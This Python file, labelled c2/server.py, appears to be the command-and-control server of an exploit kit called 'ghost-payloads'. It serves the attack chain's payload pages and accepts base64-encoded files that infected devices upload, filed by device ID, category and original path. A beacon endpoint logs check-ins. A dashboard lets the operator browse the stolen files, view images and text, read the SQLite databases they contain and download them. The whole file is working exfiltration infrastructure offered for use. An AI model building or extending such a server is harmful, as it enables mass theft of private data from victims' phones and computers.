# language: Python, file: c2/server.py
from flask import Flask, request, jsonify, send_from_directory, render_template, abort
from pathlib import Path
import json, base64, time, sqlite3, mimetypes

app = Flask(__name__, static_folder=None, template_folder="templates")
ROOT  = Path.home() / "ghost-payloads" / "payloads"
STORE = Path.home() / "ghost-payloads" / "storage"
STORE.mkdir(parents=True, exist_ok=True)

TEXT_EXT = {".txt", ".json", ".xml", ".plist", ".log", ".csv", ".md",
            ".sql", ".js", ".html", ".meta", ""}
IMG_EXT  = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".heic"}
DB_EXT   = {".db", ".sqlite", ".sqlitedb"}

def safe_join(base: Path, *parts) -> Path:
    p = base.joinpath(*parts).resolve()
    if not str(p).startswith(str(base.resolve())):
        abort(403)
    return p

# ---------- chain endpoints ----------

@app.route("/")
def index():
    return send_from_directory(ROOT, "index.html")

@app.route("/<path:path>")
def static(path):
    return send_from_directory(ROOT, path)

@app.route("/upload", methods=["POST"])
def upload():
    try:
        body = request.get_json(force=True)
    except Exception:
        return jsonify({"ok": False, "err": "json"}), 400

    dev  = body.get("deviceUUID", "unknown")
    cat  = body.get("category", "unknown")
    path = body.get("path", "unnamed")
    desc = body.get("description", "")
    size = body.get("size", 0)
    b64  = body.get("data", "")

    try:
        blob = base64.b64decode(b64)
    except Exception:
        return jsonify({"ok": False, "err": "b64"}), 400

    safe = path.replace("/", "_").replace("\\", "_")[:200] or "unnamed"
    out  = STORE / dev / cat
    out.mkdir(parents=True, exist_ok=True)
    (out / safe).write_bytes(blob)
    (out / (safe + ".meta")).write_text(json.dumps({
        "path": path, "description": desc, "size": size,
        "received": int(time.time()), "bytes": len(blob),
    }))
    print(f"[+] {dev}/{cat}/{safe}  {len(blob)}B")
    return jsonify({"ok": True})

@app.route("/beacon", methods=["POST"])
def beacon():
    d = request.get_json(silent=True) or {}
    print(f"[beacon] {d}")
    return jsonify({"ok": True})

# ---------- dashboard ----------

@app.route("/panel")
def panel():
    devices = []
    if STORE.exists():
        for d in sorted(STORE.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
            if not d.is_dir():
                continue
            files = 0
            bytes_ = 0
            cats = {}
            for cat in d.iterdir():
                if not cat.is_dir():
                    continue
                n = 0
                b = 0
                for f in cat.iterdir():
                    if f.name.endswith(".meta"):
                        continue
                    n += 1
                    b += f.stat().st_size
                cats[cat.name] = {"files": n, "bytes": b}
                files += n
                bytes_ += b
            devices.append({
                "id": d.name,
                "mtime": int(d.stat().st_mtime),
                "files": files,
                "bytes": bytes_,
                "cats": cats,
            })
    return render_template("panel.html", devices=devices)

@app.route("/panel/device/<device_id>")
def device(device_id):
    d = safe_join(STORE, device_id)
    if not d.exists():
        abort(404)
    cats = []
    for cat in sorted(d.iterdir(), key=lambda p: p.name):
        if not cat.is_dir():
            continue
        entries = []
        for f in sorted(cat.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
            if f.name.endswith(".meta"):
                continue
            meta = {}
            meta_path = cat / (f.name + ".meta")
            if meta_path.exists():
                try:
                    meta = json.loads(meta_path.read_text())
                except Exception:
                    pass
            entries.append({
                "name": f.name,
                "bytes": f.stat().st_size,
                "mtime": int(f.stat().st_mtime),
                "orig_path": meta.get("path", ""),
                "description": meta.get("description", ""),
                "is_db": f.suffix.lower() in DB_EXT,
                "is_img": f.suffix.lower() in IMG_EXT,
            })
        cats.append({"name": cat.name, "entries": entries})
    return render_template("device.html", device_id=device_id, cats=cats)

@app.route("/panel/file/<device_id>/<category>/<name>")
def file_view(device_id, category, name):
    f = safe_join(STORE, device_id, category, name)
    if not f.exists() or f.name.endswith(".meta"):
        abort(404)
    ext = f.suffix.lower()
    size = f.stat().st_size

    if ext in DB_EXT and request.args.get("t") is not None:
        return read_db_page(f, request.args.get("t", ""), device_id, category, name)

    if ext in IMG_EXT:
        mt = mimetypes.guess_type(f.name)[0] or "application/octet-stream"
        return send_from_directory(f.parent, f.name, mimetype=mt)

    if ext in TEXT_EXT and size < 5_000_000:
        try:
            content = f.read_text(errors="replace")
        except Exception:
            content = "<binary>"
        return render_template("file.html",
                               device_id=device_id, category=category,
                               name=name, size=size, mode="text", content=content,
                               tables=None, current_table=None, rows=None, cols=None)

    return render_template("file.html",
                           device_id=device_id, category=category,
                           name=name, size=size, mode="binary", content=None,
                           tables=None, current_table=None, rows=None, cols=None)

def read_db_page(path: Path, table: str, device_id, category, name):
    try:
        conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
    except Exception as e:
        return render_template("file.html",
                               device_id=device_id, category=category,
                               name=name, size=path.stat().st_size,
                               mode="db_error", content=str(e),
                               tables=None, current_table=None, rows=None, cols=None)

    cur = conn.cursor()
    try:
        cur.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
        tables = [r[0] for r in cur.fetchall()]
    except Exception:
        tables = []
    cols, rows = [], []
    if table and table in tables:
        try:
            cur.execute(f'SELECT * FROM "{table}" LIMIT 200')
            cols = [d[0] for d in cur.description]
            rows = [list(r) for r in cur.fetchall()]
        except Exception as e:
            cols = ["error"]
            rows = [[str(e)]]
    conn.close()
    rows = [[(str(v)[:400] + ("…" if len(str(v)) > 400 else "")) if v is not None else "" for v in r] for r in rows]
    return render_template("file.html",
                           device_id=device_id, category=category, name=name,
                           size=path.stat().st_size, mode="db", content=None,
                           tables=tables, current_table=table, rows=rows, cols=cols)

@app.route("/panel/raw/<device_id>/<category>/<name>")
def file_raw(device_id, category, name):
    f = safe_join(STORE, device_id, category, name)
    return send_from_directory(f.parent, f.name, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, threaded=True)
